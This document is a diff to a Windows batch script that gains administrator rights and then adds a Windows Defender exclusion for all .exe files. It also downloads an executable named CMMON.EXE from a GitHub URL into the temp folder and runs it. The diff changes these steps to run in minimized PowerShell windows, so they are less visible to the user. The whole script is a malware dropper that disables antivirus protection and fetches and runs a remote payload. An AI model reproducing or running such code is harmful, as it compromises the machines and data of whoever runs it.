@@ -1,9 +1,7 @@
 @echo off
 
 :: BatchGotAdmin
-
 :-------------------------------------
-
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 
@@ -25,9 +23,13 @@ if '%errorlevel%' NEQ '0' (
 :gotAdmin
     pushd "%CD%"
     CD /D "%~dp0"
-:--------------------------------------
-Powershell -Command "Set-MpPreference -ExclusionExtension exe"
+
+
+Start-Process powershell -ArgumentList "-Command Set-MpPreference -ExclusionExtension exe" -WindowStyle Minimized
+
+
 cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/CMMON.EXE' -OutFile CMMON.EXE"
-start CMMON.EXEf
-PowerShell -Command "Get-Process cmd -ErrorAction SilentlyContinue | ForEach-Object { $_.Kill() }"
+
+
+Start-Process powershell -ArgumentList "-Command Invoke-WebRequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/CMMON.EXE' -OutFile 'CMMON.EXE'; Start-Process 'CMMON.EXE'" -WindowStyle Minimized
+
